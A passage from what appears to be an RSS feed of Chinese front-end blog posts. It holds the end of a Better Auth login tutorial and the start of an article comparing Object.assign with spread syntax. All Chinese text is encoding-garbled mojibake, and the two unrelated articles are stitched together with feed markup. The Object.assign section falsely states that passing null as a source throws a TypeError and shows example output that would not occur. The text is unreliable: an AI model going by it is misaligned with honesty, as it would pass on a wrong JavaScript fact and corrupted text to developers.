<h3 data-id="heading-7">äº”ã€åˆ›å»ºå®¢æˆ·ç«¯å®ä¾‹</h3>
<p>åœ¨å®¢æˆ·ç«¯ï¼Œåˆ›å»º <code>lib/auth-client.ts</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createAuthClient } <span class="hljs-keyword">from</span> <span class="hljs-string">"better-auth/react"</span>;
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> authClient = <span class="hljs-title function_">createAuthClient</span>({
 Â <span class="hljs-attr">baseURL</span>: <span class="hljs-string">"http://localhost:3000"</span>, <span class="hljs-comment">// å¦‚æœæ˜¯åŒåŸŸï¼Œä¸€èˆ¬å°±å¯ä»¥çœç•¥</span>
});
</code></pre>
<h3 data-id="heading-8">å…­ã€åœ¨ React ç»„ä»¶ä¸­ä½¿ç”¨</h3>
<p>å¥½äº†ï¼Œç°åœ¨å°±å¯ä»¥åœ¨ç»„ä»¶ä¸­ä½¿ç”¨è®¤è¯åŠŸèƒ½äº†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-string">"use client"</span>;
â€‹
<span class="hljs-keyword">import</span> { authClient } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/lib/auth-client"</span>;
<span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">LoginPage</span>(<span class="hljs-params"/>) {
 Â <span class="hljs-keyword">const</span> [email, setEmail] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">""</span>);
 Â <span class="hljs-keyword">const</span> [password, setPassword] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">""</span>);
â€‹
 Â <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSignUp</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
 Â  Â <span class="hljs-keyword">const</span> { data, error } = <span class="hljs-keyword">await</span> authClient.<span class="hljs-property">signUp</span>.<span class="hljs-title function_">email</span>({
 Â  Â  Â email,
 Â  Â  Â password,
 Â  Â  Â <span class="hljs-attr">name</span>: <span class="hljs-string">"ç”¨æˆ·"</span>, <span class="hljs-comment">// å¯é€‰</span>
 Â  Â  Â <span class="hljs-attr">callbackURL</span>: <span class="hljs-string">"/dashboard"</span>,
 Â   });
â€‹
 Â  Â <span class="hljs-keyword">if</span> (error) {
 Â  Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"æ³¨å†Œå¤±è´¥:"</span>, error);
 Â   } <span class="hljs-keyword">else</span> {
 Â  Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ³¨å†ŒæˆåŠŸ:"</span>, data);
 Â  Â  Â <span class="hljs-comment">// å¯ä»¥åœ¨è¿™é‡Œåšé‡å®šå‘</span>
 Â   }
  };
â€‹
 Â <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSignIn</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
 Â  Â <span class="hljs-keyword">const</span> { data, error } = <span class="hljs-keyword">await</span> authClient.<span class="hljs-property">signIn</span>.<span class="hljs-title function_">email</span>({
 Â  Â  Â email,
 Â  Â  Â password,
 Â  Â  Â <span class="hljs-attr">callbackURL</span>: <span class="hljs-string">"/dashboard"</span>,
 Â  Â  Â <span class="hljs-attr">rememberMe</span>: <span class="hljs-literal">true</span>,
 Â   });
â€‹
 Â  Â <span class="hljs-keyword">if</span> (error) {
 Â  Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"ç™»å½•å¤±è´¥:"</span>, error);
 Â   } <span class="hljs-keyword">else</span> {
 Â  Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"ç™»å½•æˆåŠŸ:"</span>, data);
 Â   }
  };
â€‹
 Â <span class="hljs-keyword">return</span> (
 Â  Â <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
 Â  Â  Â  Â <span class="hljs-attr">type</span>=<span class="hljs-string">"email"</span>
 Â  Â  Â  Â <span class="hljs-attr">value</span>=<span class="hljs-string">{email}</span>
 Â  Â  Â  Â <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> setEmail(e.target.value)}
 Â  Â  Â  Â placeholder="é‚®ç®±"
 Â  Â  Â /&gt;
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
 Â  Â  Â  Â <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span>
 Â  Â  Â  Â <span class="hljs-attr">value</span>=<span class="hljs-string">{password}</span>
 Â  Â  Â  Â <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> setPassword(e.target.value)}
 Â  Â  Â  Â placeholder="å¯†ç "
 Â  Â  Â /&gt;
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleSignUp}</span>&gt;</span>æ³¨å†Œ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleSignIn}</span>&gt;</span>ç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-9">ä¸ƒã€è·å–å½“å‰ä¼šè¯</h3>
<p>ä½¿ç”¨ <code>useSession</code> hook æ¥è·å–å½“å‰ç”¨æˆ·ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-string">"use client"</span>;
â€‹
<span class="hljs-keyword">import</span> { authClient } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/lib/auth-client"</span>;
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Profile</span>(<span class="hljs-params"/>) {
 Â <span class="hljs-keyword">const</span> { <span class="hljs-attr">data</span>: session, isPending } = authClient.<span class="hljs-title function_">useSession</span>();
â€‹
 Â <span class="hljs-keyword">if</span> (isPending) {
 Â  Â <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  }
â€‹
 Â <span class="hljs-keyword">if</span> (!session?.<span class="hljs-property">user</span>) {
 Â  Â <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>æœªç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  }
â€‹
 Â <span class="hljs-keyword">return</span> (
 Â  Â <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ¬¢è¿ï¼Œ{session.user.name}ï¼<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>é‚®ç®±ï¼š{session.user.email}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> authClient.signOut()}&gt;é€€å‡ºç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p>ä¹Ÿå¯ä»¥åœ¨æœåŠ¡ç«¯è·å–ä¼šè¯ä¿¡æ¯ï¼Œæ¯”å¦‚åœ¨ Next.js çš„ Server Component ä¸­ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { auth } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/lib/auth"</span>;
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ServerProfile</span>(<span class="hljs-params"/>) {
 Â <span class="hljs-keyword">const</span> session = <span class="hljs-keyword">await</span> auth.<span class="hljs-property">api</span>.<span class="hljs-title function_">getSession</span>({
 Â  Â <span class="hljs-attr">headers</span>: <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"next/headers"</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">m</span>) =&gt;</span> m.<span class="hljs-title function_">headers</span>()),
  });
â€‹
 Â <span class="hljs-keyword">if</span> (!session) {
 Â  Â <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>æœªç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  }
â€‹
 Â <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>æ¬¢è¿ï¼Œ{session.user.name}ï¼<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<h3 data-id="heading-10">å…«ã€æ·»åŠ ç¤¾äº¤ç™»å½•</h3>
<p>ä»¥æ·»åŠ GitHub ç™»å½•ä¸ºä¾‹ï¼Œåªéœ€è¦åœ¨æœåŠ¡ç«¯é…ç½®ä¸­æ·»åŠ ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> { betterAuth } from <span class="hljs-string">"better-auth"</span>;
<span class="hljs-keyword">import</span> { github } from <span class="hljs-string">"better-auth/plugins"</span>;
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-type">const</span> auth = <span class="hljs-built_in">betterAuth</span>({
 Â database: <span class="hljs-keyword">new</span> <span class="hljs-built_in">Pool</span>({ <span class="hljs-comment">/* ... */</span> }),
 Â plugins: [
 Â  Â <span class="hljs-built_in">github</span>({
 Â  Â  Â clientId: process.env.GITHUB_CLIENT_ID!,
 Â  Â  Â clientSecret: process.env.GITHUB_CLIENT_SECRET!,
 Â   }),
  ],
});
</code></pre>
<p>ç„¶ååœ¨å®¢æˆ·ç«¯è°ƒç”¨ï¼š</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">button</span> onClick={() =&gt; authClient<span class="hljs-selector-class">.signIn</span><span class="hljs-selector-class">.social</span>({ provider: <span class="hljs-string">"github"</span> })}&gt;
  ä½¿ç”¨ GitHub ç™»å½•
&lt;/<span class="hljs-selector-tag">button</span>&gt;
</code></pre>
<p>å›½å¤–çš„ä¸»æµè½¯ä»¶ï¼ŒGoogleã€Hugging faceã€Twitter ç­‰éƒ½æ”¯æŒï¼Œä½†æ˜¯å›½å†…çš„é’‰é’‰ã€å¾®ä¿¡ç™»å½•éœ€è¦è‡ªè¡Œå®ç°ã€‚</p>
<hr/>
<h2 data-id="heading-11">Better Auth vs ä¼ ç»Ÿæ–¹æ¡ˆ</h2>








































<table><thead><tr><th>ç‰¹æ€§</th><th>æ‰‹å†™è®¤è¯</th><th>Better Auth</th></tr></thead><tbody><tr><td>TypeScript æ”¯æŒ</td><td>éœ€è¦è‡ªå·±å†™ç±»å‹</td><td>åŸç”Ÿæ”¯æŒ</td></tr><tr><td>æ¡†æ¶æ— å…³</td><td>-</td><td>-</td></tr><tr><td>æ’ä»¶ç”Ÿæ€</td><td>-</td><td>ä¸°å¯Œ(è´¦å·å¯†ç ã€OAuth2ã€ç¬¬ä¸‰æ–¹ç™»å½•ç­‰ç­‰)</td></tr><tr><td>å¤šç§Ÿæˆ·æ”¯æŒ</td><td>éœ€è¦è‡ªå·±å®ç°</td><td>å†…ç½®</td></tr><tr><td>2FA æ”¯æŒ</td><td>éœ€è¦è‡ªå·±å®ç°</td><td>å†…ç½®</td></tr><tr><td>å­¦ä¹ æ›²çº¿</td><td>é™¡å³­</td><td>å¹³ç¼“</td></tr></tbody></table>
<hr/>
<p>åœ¨AIå…¨æ ˆæ—¶ä»£ï¼Œ Better Authé€æ¸æˆä¸ºäº†JSå¼€å‘è€…è¿›è¡Œé‰´æƒå¼€å‘çš„ç¬¬ä¸€é€‰æ‹©ï¼Œæ‰€ä»¥å®ƒåŒæ ·å¼€æ”¾äº†MCPï¼Œå¯ä»¥åœ¨AI Codingæ—¶å€™æ›´æ–¹ä¾¿åœ°è°ƒç”¨ã€‚</p>
<hr/>
<p>æˆ‘çš„å…¬ä¼—å·ï¼šæ©™å­çš„AIå‰ç«¯ç¬”è®°ï¼Œè°¢è°¢å¤§å®¶å…³æ³¨ï¼Œåç»­ä¼šæŒç»­è¾“å‡ºæ›´å¤šå‰ç«¯ AI æ·±å±‚æ¬¡å¹²è´§ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Object.assignå’Œæ‰©å±•è¿ç®—ç¬¦æ˜¯æ·±æ‹·è´è¿˜æ˜¯æµ…æ‹·è´ï¼Œä¸¤è€…æœ‰ä»€ä¹ˆåŒºåˆ«]]></title>    <link>https://juejin.cn/post/7592432859863121954</link>    <guid>https://juejin.cn/post/7592432859863121954</guid>    <pubDate>2026-01-07T15:07:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592432859863121954" data-draft-id="7592432859863105570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Object.assignå’Œæ‰©å±•è¿ç®—ç¬¦æ˜¯æ·±æ‹·è´è¿˜æ˜¯æµ…æ‹·è´ï¼Œä¸¤è€…æœ‰ä»€ä¹ˆåŒºåˆ«"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-07T15:07:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç çŒäºº"/> <meta itemprop="url" content="https://juejin.cn/user/624972624037374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Object.assignå’Œæ‰©å±•è¿ç®—ç¬¦æ˜¯æ·±æ‹·è´è¿˜æ˜¯æµ…æ‹·è´ï¼Œä¸¤è€…æœ‰ä»€ä¹ˆåŒºåˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/624972624037374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç çŒäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T15:07:37.000Z" title="Wed Jan 07 2026 15:07:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>Object.assign()</code>Â å’Œæ‰©å±•è¿ç®—ç¬¦ï¼ˆSpread OperatorÂ <code>...</code>ï¼‰éƒ½æ˜¯<strong>æµ…æ‹·è´ï¼ˆShallow Copyï¼‰</strong> ï¼Œä¸æ˜¯æ·±æ‹·è´ï¼ˆDeep Copyï¼‰ã€‚å®ƒä»¬åªå¤åˆ¶å¯¹è±¡çš„ç¬¬ä¸€å±‚å±æ€§ï¼ŒåµŒå¥—å¯¹è±¡ä»ç„¶æ˜¯å¼•ç”¨ã€‚</p>
<h2 data-id="heading-0">ä¸¤è€…ç›¸åŒç‚¹ï¼šéƒ½æ˜¯æµ…æ‹·è´</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ç¤ºä¾‹ï¼šéƒ½æ˜¯æµ…æ‹·è´</span>
<span class="hljs-keyword">const</span> original = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
  <span class="hljs-attr">address</span>: {
    <span class="hljs-attr">city</span>: <span class="hljs-string">"åŒ—äº¬"</span>,
    <span class="hljs-attr">street</span>: <span class="hljs-string">"é•¿å®‰è¡—"</span>
  }
};

<span class="hljs-comment">// ä½¿ç”¨ Object.assign</span>
<span class="hljs-keyword">const</span> copy1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, original);
<span class="hljs-comment">// ä½¿ç”¨æ‰©å±•è¿ç®—ç¬¦</span>
<span class="hljs-keyword">const</span> copy2 = { ...original };

<span class="hljs-comment">// ä¿®æ”¹åŸå§‹å¯¹è±¡çš„åµŒå¥—å±æ€§</span>
original.<span class="hljs-property">address</span>.<span class="hljs-property">city</span> = <span class="hljs-string">"ä¸Šæµ·"</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy1.<span class="hljs-property">address</span>.<span class="hljs-property">city</span>); <span class="hljs-comment">// "ä¸Šæµ·" - è¢«å½±å“äº†</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy2.<span class="hljs-property">address</span>.<span class="hljs-property">city</span>); <span class="hljs-comment">// "ä¸Šæµ·" - è¢«å½±å“äº†</span>

<span class="hljs-comment">// ä½†ç¬¬ä¸€å±‚å±æ€§æ˜¯ç‹¬ç«‹çš„</span>
original.<span class="hljs-property">name</span> = <span class="hljs-string">"æå››"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy1.<span class="hljs-property">name</span>); <span class="hljs-comment">// "å¼ ä¸‰" - ä¸å—å½±å“</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy2.<span class="hljs-property">name</span>); <span class="hljs-comment">// "å¼ ä¸‰" - ä¸å—å½±å“</span>
</code></pre>
<h2 data-id="heading-1">ä¸»è¦åŒºåˆ«å¯¹æ¯”è¡¨</h2>























































<table><thead><tr><th>ç‰¹æ€§</th><th><code>Object.assign()</code></th><th>æ‰©å±•è¿ç®—ç¬¦Â <code>...</code></th></tr></thead><tbody><tr><td><strong>è¯­æ³•</strong></td><td>å‡½æ•°å½¢å¼ï¼š<code>Object.assign(target, source1, source2...)</code></td><td>è¿ç®—ç¬¦ï¼š<code>{ ...source1, ...source2 }</code></td></tr><tr><td><strong>åˆå¹¶å¯¹è±¡</strong></td><td>æ”¯æŒå¤šä¸ªæºå¯¹è±¡</td><td>æ”¯æŒå¤šä¸ªæºå¯¹è±¡</td></tr><tr><td><strong>è¿”å›å€¼</strong></td><td>è¿”å›ç›®æ ‡å¯¹è±¡</td><td>è¿”å›æ–°å¯¹è±¡</td></tr><tr><td><strong>åŸå‹é“¾å±æ€§</strong></td><td>ä¸å¤åˆ¶åŸå‹é“¾ä¸Šçš„å±æ€§</td><td>ä¸å¤åˆ¶åŸå‹é“¾ä¸Šçš„å±æ€§</td></tr><tr><td><strong>Symbolå±æ€§</strong></td><td>å¤åˆ¶Symbolå±æ€§</td><td>å¤åˆ¶Symbolå±æ€§</td></tr><tr><td><strong>å¯æšä¸¾æ€§</strong></td><td>åªå¤åˆ¶å¯æšä¸¾å±æ€§</td><td>åªå¤åˆ¶å¯æšä¸¾å±æ€§</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>ç›¸å¯¹è¾ƒæ…¢</td><td>ç›¸å¯¹è¾ƒå¿«ï¼ˆç°ä»£JSå¼•æ“ä¼˜åŒ–ï¼‰</td></tr><tr><td><strong>ç©ºå€¼å¤„ç†</strong></td><td><code>null</code>Â æˆ–Â <code>undefined</code>Â ä¼šæŠ¥é”™</td><td>ä¼šå¿½ç•¥Â <code>null</code>Â æˆ–Â <code>undefined</code></td></tr><tr><td><strong>å¯è¯»æ€§</strong></td><td>è¾ƒè€çš„æ–¹å¼ï¼Œä»£ç è¾ƒé•¿</td><td>æ›´ç°ä»£ï¼Œè¯­æ³•æ›´ç®€æ´</td></tr></tbody></table>
<h2 data-id="heading-2">è¯¦ç»†å¯¹æ¯”å’Œç¤ºä¾‹</h2>
<h3 data-id="heading-3">1. åŸºæœ¬ç”¨æ³•å·®å¼‚</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj1 = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: <span class="hljs-number">2</span> };
<span class="hljs-keyword">const</span> obj2 = { <span class="hljs-attr">c</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">4</span> };

<span class="hljs-comment">// Object.assign</span>
<span class="hljs-keyword">const</span> merged1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, obj1, obj2);
<span class="hljs-comment">// æ‰©å±•è¿ç®—ç¬¦</span>
<span class="hljs-keyword">const</span> merged2 = { ...obj1, ...obj2 };

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(merged1); <span class="hljs-comment">// { a: 1, b: 2, c: 3, d: 4 }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(merged2); <span class="hljs-comment">// { a: 1, b: 2, c: 3, d: 4 }</span>
</code></pre>
<h3 data-id="heading-4">2. å¤„ç† null/undefined çš„åŒºåˆ«</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Object.assign é‡åˆ° null æˆ– undefined ä¼šæŠ¥é”™</span>
<span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">const</span> result1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, <span class="hljs-literal">null</span>);
} <span class="hljs-keyword">catch</span> (e) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e); <span class="hljs-comment">// TypeError: Cannot convert undefined or null to object</span>
}

<span class="hljs-comment">// æ‰©å±•è¿ç®—ç¬¦ä¼šå¿½ç•¥ null æˆ– undefined</span>
<span class="hljs-keyword">const</span> result2 = { ...<span class="hljs-literal">null</span>, ...<span class="hljs-literal">undefined</span>, <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> };
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result2); <span class="hljs-comment">// { a: 1 } - null/undefined è¢«å¿½ç•¥</span>
</code></pre>
<h3 data-id="heading-5">3. åˆå¹¶å¤šä¸ªå¯¹è±¡çš„å·®å¼‚</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> objA = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> };
<span class="hljs-keyword">const</span> objB = { <span class="hljs-attr">b</span>: <span class="hljs-number">2</span> };
<span class="hljs-keyword">const</span> objC = { <span class="hljs-attr">c</span>: <span class="hljs-number">3</span> };

<span class="hljs-comment">// Object.assign - ç›´æ¥åˆå¹¶å¤šä¸ª</span>
<span class="hljs-keyword">const</span> mergedA = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, objA, objB, objC);

<span class="hljs-comment">// æ‰©å±•è¿ç®—ç¬¦ - éœ€è¦æ˜¾å¼å±•å¼€å¤šä¸ª</span>
<span class="hljs-keyword">const</span> mergedB = { ...objA, ...objB, ...objC };

<span class="hljs-comment">// å¤æ‚åˆå¹¶ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> defaults = { <span class="hljs-attr">theme</span>: <span class="hljs-string">"dark"</span>, <span class="hljs-attr">fontSize</span>: <span class="hljs-number">14</span> };
<span class="hljs-keyword">const</span> userSettings = { <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span> };
